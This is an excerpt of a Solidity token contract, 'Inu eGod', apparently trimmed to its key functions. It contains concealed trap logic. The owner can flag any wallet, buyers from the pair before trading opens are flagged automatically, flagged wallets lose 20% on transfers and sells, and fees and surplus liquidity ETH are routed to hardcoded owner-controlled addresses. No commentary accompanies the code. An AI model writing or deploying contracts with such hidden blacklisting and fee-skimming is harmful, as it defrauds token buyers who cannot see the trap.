...
contract InueGod2 is Context, IERC20, Ownable {
    ...
    address private  _marketingWallet = 0x5580048bABE726aF5759a9F47D593d53d73fBcdC;
    uint256 private _tTotal = 10000000 * 10**9;
    uint256 public _maxTxAmount = _tTotal * 125 / 10000; 
    uint256 public _maxWalletToken = _tTotal * 250 / 10000;

    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 5 * 10**9;
    string private constant _name = "Inu eGod"; 
    string private constant _symbol = "IGod";
    ...
    mapping (address => bool) public _isLoki;
    ...
    function RemoveTxWalletLimit() external onlyOwner {
    ...
    function isBLoki(address[] memory accounts, bool state) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            // _isExcludedFromFee[accounts[i]] = state;
            _isLoki[accounts[i]] = state;
        }
    }

    function isLoki(address account) public view returns(bool) {
        return _isLoki[account];
    }    
    ...
    function _getValuesLoki(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * 20 / 100; 
    ...
    function _transfer(
        ...
        require(amount > 0, "Transfer amount must be greater than zero");
         ...
         if(from != _marketingWallet && to != _marketingWallet && to != uniswapV2Pair){
        ...
        if (from == uniswapV2Pair && !marketActive && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                _isLoki[to] = true;
        }
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            if (to == uniswapV2Pair && _isLoki[from]) {
                transferAmount = _getValuesLoki(amount, from);
            }
            if (marketActive && _isLoki[from]) {
                transferAmount = _getValuesLoki(amount, from);
            }
            if (marketActive && _isLoki[to]) {
                transferAmount = _getValuesLoki(amount, from);
            }
        } 
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        uint256 a_part = ethToSend * 25 / 100;
        uint256 b_part = ethToSend * 75 / 100;
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0){
            payable(address(0x74176FA7eF23bd5c310765cafec44dE83Fa3baCA)).sendValue ((ethAmount - ethFromLiquidity) * 25 / 100);
            payable(_marketingWallet).sendValue ((ethAmount - ethFromLiquidity) * 75 / 100);
        }
    }
}